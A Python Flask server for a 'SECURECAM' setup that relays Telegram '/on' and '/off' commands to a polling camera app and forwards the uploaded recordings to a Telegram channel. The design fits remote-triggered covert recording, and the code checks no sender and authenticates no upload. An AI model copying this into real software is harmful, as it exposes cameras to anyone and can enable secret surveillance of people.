from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import os
import time
import requests
import threading
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Telegram Bot Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ⚠️ Change this
CHANNEL_ID = "YOUR_CHANNEL_ID"      # ⚠️ Change this

# Storage
pending_command = None
command_lock = threading.Lock()

# ============================================================================
# TELEGRAM BOT FUNCTIONS
# ============================================================================

def send_telegram_message(chat_id, text):
    """Send message to Telegram chat"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Error sending message: {e}")

def send_telegram_video(chat_id, video_path, caption=""):
    """Send video to Telegram chat"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    
    with open(video_path, 'rb') as video_file:
        files = {'video': video_file}
        data = {
            'chat_id': chat_id,
            'caption': caption,
            'parse_mode': 'HTML'
        }
        
        try:
            response = requests.post(url, files=files, data=data, timeout=120)
            return response.json().get('ok', False)
        except Exception as e:
            print(f"Error sending video: {e}")
            return False

def edit_telegram_message(chat_id, message_id, text):
    """Edit existing Telegram message"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json().get('ok', False)
    except Exception as e:
        print(f"Error editing message: {e}")
        return False

def telegram_bot_listener():
    """Listen for Telegram commands"""
    offset = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 30}
            
            response = requests.get(url, params=params, timeout=35)
            updates = response.json().get('result', [])
            
            for update in updates:
                offset = update['update_id'] + 1
                message = update.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                text = message.get('text', '')
                
                if not chat_id or not text:
                    continue
                
                # Handle commands
                if text == '/start':
                    send_telegram_message(chat_id, 
                        "🎥 <b>SECURECAM v3</b>\n\n"
                        "Commands:\n"
                        "/on - Start camera & recording\n"
                        "/off - Stop & upload video")
                
                elif text == '/on':
                    global pending_command
                    with command_lock:
                        pending_command = "start"
                    send_telegram_message(chat_id, "✅ Camera ON + Recording started")
                
                elif text == '/off':
                    with command_lock:
                        pending_command = "stop"
                    send_telegram_message(chat_id, "⏹️ Stopping... Upload will start")
            
            time.sleep(1)
            
        except Exception as e:
            print(f"Bot listener error: {e}")
            time.sleep(5)

# ============================================================================
# FLASK API ENDPOINTS
# ============================================================================

@app.route('/api/cmd/get', methods=['GET'])
def get_command():
    """App polls this endpoint to get commands"""
    global pending_command
    
    with command_lock:
        cmd = pending_command
        pending_command = None  # Clear after reading
    
    return jsonify({"action": cmd or "none"})

@app.route('/api/video/upload', methods=['POST'])
def upload_video():
    """Receive video from app and upload to Telegram"""
    try:
        if 'video' not in request.files:
            return jsonify({"error": "No video file"}), 400
        
        video = request.files['video']
        
        # Save video temporarily
        temp_path = f"/tmp/video_{int(time.time())}.mp4"
        video.save(temp_path)
        
        # Convert to MP4 if needed (using ffmpeg)
        output_path = f"/tmp/video_final_{int(time.time())}.mp4"
        
        cmd = [
            'ffmpeg', '-i', temp_path,
            '-c:v', 'libx264', '-preset', 'fast',
            '-c:a', 'aac',
            '-movflags', '+faststart',
            '-y', output_path
        ]
        
        result = subprocess.run(cmd, capture_output=True, timeout=300)
        
        if result.returncode != 0:
            # If conversion fails, use original file
            output_path = temp_path
        
        # Upload to Telegram
        caption = f"🎥 Recording\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        success = send_telegram_video(CHANNEL_ID, output_path, caption)
        
        # Cleanup
        try:
            os.remove(temp_path)
            if output_path != temp_path:
                os.remove(output_path)
        except:
            pass
        
        if success:
            return jsonify({"status": "success", "message": "Video uploaded"})
        else:
            return jsonify({"status": "error", "message": "Upload failed"}), 500
            
    except Exception as e:
        print(f"Upload error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "running", "version": "3.0"})

# ============================================================================
# START SERVER
# ============================================================================

if __name__ == '__main__':
    # Start Telegram bot listener in background
    bot_thread = threading.Thread(target=telegram_bot_listener, daemon=True)
    bot_thread.start()
    
    print("✅ Server started")
    print("✅ Telegram bot listener started")
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
